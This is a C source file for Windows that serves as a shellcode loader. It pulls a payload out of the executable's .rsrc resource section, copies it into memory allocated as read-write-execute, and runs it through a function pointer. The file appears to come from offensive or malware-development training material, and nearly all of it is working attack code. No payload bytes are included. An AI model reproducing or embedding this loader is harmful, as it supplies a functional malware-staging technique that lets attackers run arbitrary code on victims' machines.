#include <Windows.h>
#include <stdio.h>
#include "resource.h"

int main() {

	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;
	PVOID		pPayloadAddress = NULL;
	SIZE_T		sPayloadSize = NULL;


	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		// in case of function failure 
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		// in case of function failure 
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Printing pointer and size to the screen
	printf("[i] pPayloadAddress var : 0x%p \n", pPayloadAddress);

	void* executableBuffer = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (executableBuffer == NULL) {
		printf("Failed to allocate executable buffer.\n");
		return 1;
	}

	memcpy(executableBuffer, pPayloadAddress, sPayloadSize);

	// Declare a function pointer type that matches the shellcode signature
	typedef void (*ShellcodeFunction)();

	// Cast the executable buffer as a function pointer
	ShellcodeFunction shellcodeFunc = (ShellcodeFunction)executableBuffer;

	// Call the shellcode function
	shellcodeFunc();

	// Free the executable buffer
	VirtualFree(executableBuffer, 0, MEM_RELEASE);

	return 0;
}
